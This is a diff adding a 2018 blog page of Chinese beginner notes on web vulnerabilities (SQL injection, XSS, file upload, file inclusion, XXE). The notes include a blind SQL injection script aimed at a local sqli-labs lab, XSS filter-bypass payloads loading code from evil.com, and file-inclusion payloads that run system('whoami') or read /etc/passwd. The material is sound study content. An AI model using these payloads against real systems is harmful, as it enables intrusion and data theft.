@@ -1,0 +1,945 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="Call me by your name">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    面试三叶草笔记 |
+    
+    Ayrain&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-新芽面试笔记" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      面试三叶草笔记
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2018/12/29/%E6%96%B0%E8%8A%BD%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time datetime="2018-12-29T10:25:50.000Z" itemprop="datePublished">2018-12-29</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>面试三叶草报告，web基础漏洞的大致讲解，入门笔记理解较浅。</p>
+<a id="more"></a>
+
+<h3 id="新芽面试报告"><a href="#新芽面试报告" class="headerlink" title="新芽面试报告"></a>新芽面试报告</h3><p>[toc]</p>
+<h3 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h3><hr>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>通过把<strong>SQL命令</strong>插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<h5 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h5><ul>
+<li><p>GET</p>
+</li>
+<li><p>POST</p>
+</li>
+<li><p>X-Forwarded-For</p>
+</li>
+<li><p>Cookie</p>
+</li>
+<li><p>User-Agent</p>
+</li>
+</ul>
+<p>登录页面的注入大多在http头的client-ip和x-forward-for，一般用来记录登录的ip地址。</p>
+<h5 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h5><p>能使用union有显示位</p>
+<h5 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h5><p>即可以根据返回页面判断条件真假的注入。</p>
+<h5 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h5><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即<strong>页面返回时间是否增加</strong>）来判断。</p>
+<h5 id="基于报错注入"><a href="#基于报错注入" class="headerlink" title="基于报错注入"></a>基于报错注入</h5><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p><strong>盲注的核心</strong>其实是用字符串截取函数<strong>一位一位的截取数据</strong>，之后把截取到的数据用字符转ascii函数转换成ascii码和数字进行对比，再之后将ascii码还原成字符。</p>
+<p>二分法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select databases()),1,1)</span><br></pre></td></tr></table></figure>
+
+<p>截取 查询结果 即数据库的第一位字母转化为ascii，判断执行这个字母是否正确，一步步二分。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select databases()),1,1)&gt;64 %23</span><br></pre></td></tr></table></figure>
+
+<p>可以根据返回的字节大小来快速判断是否正确，二分查询后面的数字。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#conding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url_init &#x3D; &quot;http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-8&#x2F;?id&#x3D;1&quot;;;</span><br><span class="line"></span><br><span class="line">url_init_error &#x3D; url_init + &quot;&#39;&quot;</span><br><span class="line"></span><br><span class="line">length_init &#x3D; requests.get(url_init).headers.get(&#39;Content-Length&#39;) &#x2F;&#x2F;获取 正常返回应有的长度</span><br><span class="line"></span><br><span class="line">database&#x3D;&quot;&quot;</span><br><span class="line"></span><br><span class="line">\#写一个方法二分快速获取应该判断的数字</span><br><span class="line"></span><br><span class="line">\#返回数字，传入布尔值，对还是错，对应的数字。</span><br><span class="line"></span><br><span class="line">\#正经的二分查询。有序的字符中，最大最小。65到122</span><br><span class="line"></span><br><span class="line">def get_length(url):</span><br><span class="line"></span><br><span class="line">length &#x3D; requests.get(url).headers.get(&#39;Content-Length&#39;)</span><br><span class="line"></span><br><span class="line">\#print(&quot;length:&quot;+str(length))</span><br><span class="line"></span><br><span class="line">\#正确的</span><br><span class="line"></span><br><span class="line">if (length &#x3D;&#x3D; length_init):</span><br><span class="line"></span><br><span class="line">return True</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">return False</span><br><span class="line"></span><br><span class="line">def geturl(n,number):</span><br><span class="line"></span><br><span class="line">url &#x3D; url_init_error+&quot;and ascii(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;.format(n,number)</span><br><span class="line"></span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">return url</span><br><span class="line"></span><br><span class="line">def efs(min_number,max_number,n):</span><br><span class="line"></span><br><span class="line">if(max_number-min_number&#x3D;&#x3D;1):</span><br><span class="line"></span><br><span class="line">print(&quot;[+] get &quot;+chr(max_number))</span><br><span class="line"></span><br><span class="line">global database</span><br><span class="line"></span><br><span class="line">database&#x3D;database+(chr(max_number))</span><br><span class="line"></span><br><span class="line">print(&#39;[+] databse is &#123;0&#125;&#39;.format(database))</span><br><span class="line"></span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">number &#x3D; int((min_number+max_number)&#x2F;2)</span><br><span class="line"></span><br><span class="line">\#print(number)</span><br><span class="line"></span><br><span class="line">url &#x3D; geturl(n,number)</span><br><span class="line"></span><br><span class="line">\#print(url)</span><br><span class="line"></span><br><span class="line">\#如果比中间大</span><br><span class="line"></span><br><span class="line">if get_length(url):</span><br><span class="line"></span><br><span class="line">efs(number,max_number,n)</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">efs(min_number,number,n)</span><br><span class="line"></span><br><span class="line">for n in range(1,10):</span><br><span class="line"></span><br><span class="line">\#如果大于1都不满足就是结束了</span><br><span class="line"></span><br><span class="line">if(get_length(geturl(n,1))is False):</span><br><span class="line"></span><br><span class="line">break</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">efs(65,127,n)</span><br></pre></td></tr></table></figure>
+
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>当用php链接mysql时，设置 set character_set_client=<strong>gbk</strong>会导致一份编码转换的注入问题</p>
+<p>1%df’ = 1運’ %df和\（%5c）结合等于運</p>
+<p>例如id参数存在宽字节注入</p>
+<h5 id="二次urldecode注入"><a href="#二次urldecode注入" class="headerlink" title="二次urldecode注入"></a>二次urldecode注入</h5><p>程序进行了参数的过滤</p>
+<p>例如addslashes（） 或开gpc 也就是给单双引号反斜杠null加反斜杠转义。</p>
+<p>但是 如果使用了urldecode或rawurldecode。则会导致<strong>二次解码</strong>而<strong>生成单引号</strong>。</p>
+<p>例如：%2527 <strong>%25解码为%</strong>， <strong>%27解码为‘</strong></p>
+<h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p><strong>注释符号绕过</strong></p>
+<p>– 注释内容</p>
+<p>`# 注释内容</p>
+<p>/<em>注释内容</em>/</p>
+<p><strong>内联注释</strong></p>
+<p>就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。</p>
+<p><strong>空格过滤绕过</strong></p>
+<p>/**/</p>
+<p>()</p>
+<p>回车(url编码中的%0a)</p>
+<p>`(tap键上面的按钮)</p>
+<p>tap</p>
+<p>两个空格</p>
+<p><strong>过滤or and xor not 绕过</strong></p>
+<p>and = &amp;&amp;</p>
+<p>or = ||</p>
+<p>xor = | # 异或</p>
+<p>not = !</p>
+<p><strong>过滤等号=绕过</strong></p>
+<p>不加通配符的like执行的效果和=一致</p>
+<p><strong>使用大小于号来绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;等价于 !&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>所以在前面再加一个!结果就是等号了</p>
+<p><strong>替代逗号的方法</strong></p>
+<p>使用from pos for len，其中pos代表从pos个开始读取len长度的子串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select substr(&quot;string&quot; from 1 for 3)</span><br></pre></td></tr></table></figure>
+
+<p><strong>过滤大小于号绕过</strong></p>
+<p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果</p>
+<p>使用以下的关键字来绕过</p>
+<p>greatest(n1, n2, n3…):<strong>返回n中的最大值</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id &#x3D; 1 and greatest(ascii(substr(username,1,1)),1)&#x3D;116;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/huanghelouzi/article/details/829" target="_blank" rel="noopener">绕过姿势</a></p>
+<hr>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><h5 id="三种类型"><a href="#三种类型" class="headerlink" title="三种类型"></a>三种类型</h5><p>反射型：</p>
+<ul>
+<li>脚本附加到url参数中</li>
+</ul>
+<p>存储型：</p>
+<ul>
+<li>存储在web服务器。反射型与存储型的区别在于<strong>交互</strong>。</li>
+</ul>
+<p>dom型：</p>
+<ul>
+<li><p>类似于反射型，仍是通过url控制页面输出，只因为输出地点不同（<strong>输出点</strong>在<strong>DOM</strong>）而导致结果不同。</p>
+</li>
+<li><p>dom就是一个树状的模型，你可以编写Javascript代码根据dom一层一层的节点，去遍历/获取/修改对应的节点，对象，值。</p>
+</li>
+</ul>
+<h5 id="绕过xss-fliter"><a href="#绕过xss-fliter" class="headerlink" title="绕过xss fliter"></a>绕过xss fliter</h5><p><strong>用html的各种标签属性</strong></p>
+<ul>
+<li><img src="javascript:alert('xss');"></li>
+<li><p>&lt;table background=”javascrpt:alert(/xsss)”&gt;</table></p>
+</li>
+<li><p>要引用文件的属性才能让触发跨站脚本</p>
+</li>
+<li><p>过滤关键字防御</p>
+</li>
+</ul>
+<p><a href="https://blog.csdn.net/qq_29277155/article/details/51320064" target="_blank" rel="noopener">payloads</a></p>
+<p><strong>href</strong></p>
+<p><code>&lt;ahref=&quot;javascript:alert(&#39;test&#39;)&quot;&gt;link&lt;/a&gt;</code></p>
+<p><strong>tab拆分</strong></p>
+<ul>
+<li>若仅过滤敏感字 用空格回车tab将敏感字拆分</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;img src&#x3D;&quot;javas</span><br><span class="line"></span><br><span class="line">cript:</span><br><span class="line"></span><br><span class="line">alert(&#x2F;xss&#x2F;)&quot; width&#x3D;100&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>对标签属性值转码</strong></p>
+<ul>
+<li>t=&amp;#116 :=: tab=</li>
+</ul>
+<p><strong>JavaScript 事件</strong></p>
+<p><code>&lt;input type=&quot;button&quot; value=&quot;click me&quot; onclick=&quot;alert(&#39;click me&#39;)&quot;/&gt;</code></p>
+<ul>
+<li><p>产生自己的事件（事件处理函数：<code>click mouseover load onerror（图片src不存在(页面发生错误)就触发。）</code>）</p>
+</li>
+<li><p>事件能够说明用户何时做了某件事情或页面何时加载完毕。</p>
+</li>
+</ul>
+<p>事件类别：用户接口 逻辑 变化</p>
+<p><strong><u>CSS import</u></strong></p>
+<ul>
+<li><p>引入css用<code>&lt;link&gt;</code>或 <code>&lt;style type=&#39;text/css&#39;&gt;@import url(http://www.evil.com/xss.css);&lt;/style&gt;</code></p>
+</li>
+<li><p>此外，@import 能直接执行JavaScript代码</p>
+</li>
+</ul>
+<p><code>&lt;style&gt;@import &#39;javascript:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code></p>
+<p><u>所以：（expression javascript import等敏感字符的样式表要过滤）</u></p>
+<p><strong>扰乱过滤规则</strong></p>
+<ul>
+<li>大小写 单双引号 构造不同全角字符</li>
+</ul>
+<p><strong>其他</strong></p>
+<ul>
+<li>/**/ \ \0 会被被浏览器忽略 关键字转码 扰乱过滤。</li>
+</ul>
+<p><strong>字符编码</strong></p>
+<ul>
+<li>JavaScript eval()函数执行16 10进制（string.formcharcode）脚本。用\连接十六进制字符串，然后用<strong>eval（）函数执行十六进制</strong>字符串形式的脚本。</li>
+</ul>
+<p><strong>拆分跨站</strong></p>
+<ul>
+<li>不限制&lt;&gt;却限制长度，引入一个变量z。存储型实例</li>
+</ul>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/79959983" target="_blank" rel="noopener">绕过文章</a></p>
+<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><ul>
+<li><p><strong>HTML解析、JS解析，URL解析</strong>，每个解析器负责HTML文档中各自对应部分的解析工作。</p>
+</li>
+<li><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这一过程完成HTML解码并<strong>创建DOM树</strong>，接下来JavaScript解析器会介入对内联脚本进行解析，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器<strong>之前或之后</strong>解析。</p>
+</li>
+<li><p><img src="evernotecid://ED5BC285-100B-4E9E-B874-F409362B85BE/appyinxiangcom/22159355/ENResource/p23" alt="c840b033a7f2a1742e22f0e6d40dc437.png"></p>
+</li>
+</ul>
+<p>Value1：HTML解码 <strong>JavaScript解码</strong> URL解码</p>
+<p>Value2：HTML解码 <strong>URL解码</strong> JavaScript解码 URL解码</p>
+<ul>
+<li>利用编码绕过</li>
+</ul>
+<p><a href="https://blog.csdn.net/u010726042/article/details/76259398" target="_blank" rel="noopener">详解</a></p>
+<h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul>
+<li><p>在将不可信数据插入到<strong>HTML标签之间</strong>时，对这些数据进行HTML Entity（字符转义）编码。</p>
+</li>
+<li><p>根据不可信数据将要被放置到的地方进行<strong>相应的编码</strong>，比如放到<div>标签之间的时候，需要进行HTML编码，放到<div>标签属性里的时候，需要进行HTML属性编码。</p>
+</li>
+<li><p><strong>HTTP-only cookie</strong>，禁止JavaScript读取某些敏感cookie（在cookie中设置了HTTPonly属性，那么document.cookie将无法读取到cookie信息）</p>
+</li>
+<li><p>验证码 防止脚本冒充用户提交危险操作</p>
+</li>
+</ul>
+<p>比较新的（csp 一种<strong>白名单</strong> 可在http头部和<meta>标签启用）</p>
+<ul>
+<li><p>禁止<strong>加载外域代码</strong>，（防止复杂的攻击逻辑。）</p>
+</li>
+<li><p>禁止<strong>外域提交</strong>，（网站被攻击后，用户的数据不会泄露到外域。）</p>
+</li>
+<li><p>禁止<strong>内联脚本执行</strong>（ GitHub ）。</p>
+</li>
+<li><p>禁止<strong>未授权的脚本执行</strong>（新特性，Google Map 移动版）。</p>
+</li>
+</ul>
+<hr>
+<h5 id="各种攻击方法"><a href="#各种攻击方法" class="headerlink" title="各种攻击方法"></a>各种攻击方法</h5><p><strong>钓鱼攻击</strong>：</p>
+<ul>
+<li>构造钓鱼页面（一般为表单部分 可从真实网页复制过去）记录信息的脚本</li>
+</ul>
+<p><strong>xss重定向钓鱼</strong>：</p>
+<ul>
+<li>跳转至仿造正常网页</li>
+</ul>
+<p><strong>html注入式表单</strong>：</p>
+<ul>
+<li>正常页面嵌入一个表单</li>
+</ul>
+<p><strong>xss跨框架钓鱼</strong>：</p>
+<ul>
+<li>/<iframe>标签嵌入远程的一个页面。此时主页面依然在正常网站的域名下</li>
+</ul>
+<p><strong>注入JavaScript脚本劫持html表单和控制web的行为</strong>：</p>
+<ul>
+<li><p>截取用户名和密码信息提交给php脚本</p>
+</li>
+<li><p>键盘记录器</p>
+</li>
+<li><p>获取历史记录</p>
+</li>
+<li><p>端口扫描</p>
+</li>
+<li><p>截获剪贴板</p>
+</li>
+<li><p>获取ip</p>
+</li>
+</ul>
+<p><strong>网页挂马</strong></p>
+<ul>
+<li>篡改网页</li>
+</ul>
+<p><strong>蠕虫</strong></p>
+<p><strong>DOS DDoS</strong></p>
+<hr>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><h5 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h5><h5 id="iis5-x-6-x解析漏洞"><a href="#iis5-x-6-x解析漏洞" class="headerlink" title="iis5.x-6.x解析漏洞"></a>iis5.x-6.x解析漏洞</h5><p>大多数为Windows server 2003 ,开发语言一般为asp.</p>
+<h6 id="目录解析（6-0）"><a href="#目录解析（6-0）" class="headerlink" title="目录解析（6.0）"></a>目录解析（6.0）</h6><p><code>www.xxx.com/xx.asp/xx.jpg</code></p>
+<p>原理：服务器默认把.asp 目录下的文件<strong>都解析成asp文件</strong>。</p>
+<p>（IIS6.0 默认的<strong>可执行文件</strong>除了asp还包含这三种:/test.asa/test.cer/test.cdx）</p>
+<h6 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h6><p><code>www.xxx.com/xx.asp;.jpg</code></p>
+<p>原理：服务器默认<strong>不解析;后面的内容</strong>，xxasp;jpg执行为asp.</p>
+<h5 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h5><p><code>www.xxxx.xxx.com/test.php.php123</code></p>
+<p>原理：Apache文件从右到左开始判断解析，不可识别时再往左。</p>
+<p>（文件类型判断在 Apache mime.types中）</p>
+<p>（这种可以绕过基于黑名单的）</p>
+<h6 id="Apache其余配置问题"><a href="#Apache其余配置问题" class="headerlink" title="Apache其余配置问题"></a>Apache其余配置问题</h6><p>（1）：</p>
+<p>如果在 Apache 的 httpd.conf 里有这样一行配置 <strong>AddHandler php5-script .php</strong></p>
+<p>这时只要文件名里包含.php 即使文件名是 test2.php.jpg** 也会以 php 来执行**</p>
+<p>（2）：</p>
+<p>在Apache的配置文件httpd.conf文件中有：<strong>AddType application/x-httpd-php .php .html .phtml</strong></p>
+<p>.html.phtml</p>
+<p>这主要通过正则匹配。</p>
+<h5 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h5><p><code>www.xxxx.com/1.jpg/1.php</code></p>
+<p><code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code></p>
+<p><code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></p>
+<p>若1.php不存在此时的1.jpg会被<strong>当作PHP脚本</strong>来解析</p>
+<p>这个解析漏洞其实是PHP CGI的漏洞</p>
+<p>在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo位于.ini，默认是开启的</p>
+<p>当URL中有不存在的文件，PHP就会向前<strong>递归解析</strong>。</p>
+<h5 id="绕过-upload-labs"><a href="#绕过-upload-labs" class="headerlink" title="绕过(upload-labs)"></a>绕过(upload-labs)</h5><p><strong>绕过服务器</strong></p>
+<ul>
+<li><p>空格</p>
+</li>
+<li><p>双写</p>
+</li>
+<li><p>文件名+”::$DATA</p>
+</li>
+<li><p>大小写</p>
+</li>
+</ul>
+<p><strong>js绕过（此方法基于客户端</strong>）</p>
+<ul>
+<li><p>禁用js</p>
+</li>
+<li><p>抓包修改后缀名</p>
+</li>
+</ul>
+<p><strong>对数据包的mime进行检查</strong></p>
+<ul>
+<li><p>mime是设定某种扩展名的文件用一种应用程序来打开的方式类型</p>
+</li>
+<li><p>request中通过getcontentype()获取请求中的mime的内容类型</p>
+</li>
+<li><p>只是服务器对后缀名进行验证。</p>
+</li>
+<li><p>抓包改后缀，修改文件类型。</p>
+</li>
+</ul>
+<p><strong>文件内容头校验（GIF89a）</strong></p>
+<ul>
+<li>添加GIF图片的文件头绕过检查</li>
+</ul>
+<h5 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h5><p><strong><u>00截断简介</u></strong></p>
+<p>PHP的00截断是5.2.x版本的一个漏洞，当用户输入的url参数包含<u>%00经过浏览器自动转码后截断后面字符</u>。</p>
+<p><strong>条件</strong></p>
+<p>php版本小于5.3.4</p>
+<p>php的magic_quotes_gpc为OFF状态</p>
+<p><strong>主要利用常见</strong>：</p>
+<p>1.上传时<strong>路径可控</strong>，使用00截断</p>
+<p>2.文件包含时，00截断后面限制(主要是本地包含时)</p>
+<p>3.其它与文件操作有关的地方都可能使用00截</p>
+<p>断。</p>
+<hr>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p>include()：执行到include时才包含文件，找不到被包含文件时只会产生<strong>警告</strong>，脚本将继续执行</p>
+<p>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命<strong>错误</strong>，并停止脚本</p>
+<p>include_once()和require_once()：若文件中代码已被包含则不会再次包含</p>
+<h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><p><strong>本地文件包含</strong></p>
+<p>上传图片马，然后包含</p>
+<p>读敏感文件，读PHP文件</p>
+<p>包含日志文件GetShell</p>
+<p>包含/proc/self/envion文件GetShell</p>
+<p>包含data:或php://input等伪协议</p>
+<p>若有phpinfo则可以包含临时文件</p>
+<p>包含session文件：</p>
+<p>需要攻击者能控制部分session文件的内容，比如：x|s:19:”&lt;?php phpinfo()；？&gt;”</p>
+<p>默认生成的session文件存放在/tmp下 /tmp/sess_sessionid</p>
+<p><strong>远程文件包含</strong></p>
+<p>php.ini中</p>
+<p>allow_url_fopen和allow_url_include都要为On</p>
+<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> php?a&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line"></span><br><span class="line">post:&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接读取到post上没有经过解析的原始数据</p>
+<p>不能获multipart/form-data方式提交的数据</p>
+<p>allow_url_include=on</p>
+<p>利用方法：</p>
+<p><strong>将要执行的语法php代码写在post中提交</strong>，不用键与值的形式，只写代码即可。</p>
+<p>file_get_contents()的$filename参数不仅仅为文件路径，还可以是一个URL（伪协议）。</p>
+<h5 id="data"><a href="#data" class="headerlink" title="data"></a>data</h5><p>data 与input 类似，都是用户可以控制传入的php代码</p>
+<p>php版本大于等于php5.2</p>
+<p>allow_url_fopen = On</p>
+<p>allow_url_include = On</p>
+<p><code>index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>
+<p><code>index.php?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
+<p><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
+<h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><p><u><strong>php://filter</strong></u></p>
+<p><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>数据流打开时的筛选过滤</p>
+<p>对本地磁盘文件进行读写</p>
+<p>就是在执行代码前将代码换个方式读取出来</p>
+<p><strong>Q</strong>:为什么要base64</p>
+<p><strong>A</strong>:直接包含php文件时会被解析（敲黑板）</p>
+<p>读取敏感信息</p>
+<p><code>http://www.xxx.com/index.php?page=/etc/passwd</code></p>
+<p><strong>一道题</strong>：只能传入txt，就能传入base64编码的<?php phpinfo(); ?> 然后用fliter解码包含这个文件。</p>
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>用法与phar类似</p>
+<p>php版本大于等于php5.3.0</p>
+<p>只能传入绝对路径</p>
+<p>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23</p>
+<p><code>index.php?file=zip://D:\phpStudy\WWW\fileinclude\test.zip%23test.txt</code></p>
+<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>以查找指定<strong>压缩包内</strong>的文件</p>
+<p>php版本大于等于php5.3.0</p>
+<p>指定绝对路径或相对路径</p>
+<p><code>index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/test.txt</code></p>
+<h5 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h5><p>主要是得到日志的路径</p>
+<p>凌晨包含最佳</p>
+<p>默认位置/var/log/httpd/access_log，读Apache配置文件也许可以获取日志路径</p>
+<p>日志会记录客户端请求及服务器响应的信息，访问</p>
+<p><code>http://www.xx.com/&lt;?php phpinfo(); ?&gt;</code>时</p>
+<?php phpinfo(); ?><p>也会被记录在日志，或者ua加代码</p>
+<p>再包含日志文件</p>
+<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p>PHP会为上传文件创建临时文件，其目录在PHP.ini的upload_tmp_dir中定义。</p>
+<p>但该值默认为空，此时在Linux下使用/tempo文件，在Windows下使用c:\windows\temp目录（phpinfo）</p>
+<p>该临时文件文件名随机，可以暴力猜解文件名。</p>
+<h5 id="各种截断"><a href="#各种截断" class="headerlink" title="各种截断"></a>各种截断</h5><p>不能写入php扩展名</p>
+<p>1：%00</p>
+<p>2：？伪截断</p>
+<p>不受gpc和php版本限制。访问xxx/1.txt 和 xxx/1.txt?.php返回结果一样</p>
+<p>3：多个./截断，在php5.3后被修复。</p>
+<hr>
+<h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><ul>
+<li><p>对非安全的<strong>外部实体数据进⾏处理</strong>时引发的安全问题</p>
+</li>
+<li><p>发生在应用程序<strong>解析XML输入</strong>时，没有<strong>禁止外部实体的加载</strong>，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。</p>
+</li>
+</ul>
+<h5 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h5><ul>
+<li><p>传输存储数据</p>
+</li>
+<li><p>两个不同技术的系统用来进行通信和交换数据</p>
+</li>
+<li><p>xml语言没有预定义的标签，允许作者定义自己的标签和文档结构。</p>
+</li>
+</ul>
+<h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><ul>
+<li><p><strong>定义</strong>xml文档的合法构建<strong>模块</strong></p>
+</li>
+<li><p>可被声明于xml文档中，也可以作为一个外部引用。类似于import 和 include</p>
+</li>
+</ul>
